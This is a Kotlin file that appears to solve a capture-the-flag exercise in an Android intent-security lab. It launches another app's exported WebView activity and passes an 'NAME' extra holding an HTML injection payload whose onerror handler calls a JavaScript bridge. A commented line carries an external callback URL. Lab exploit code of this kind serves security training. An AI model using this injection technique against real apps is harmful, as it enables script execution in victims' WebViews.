package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent

object Flag39 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"
            )
//            putExtra("URL", "https://hextree.free.beeceptor.com/flag38")
            putExtra("NAME", "<img src=x onerror='window.hextree.success()'/>")
        }
        context.startActivity(intent)
    }
}
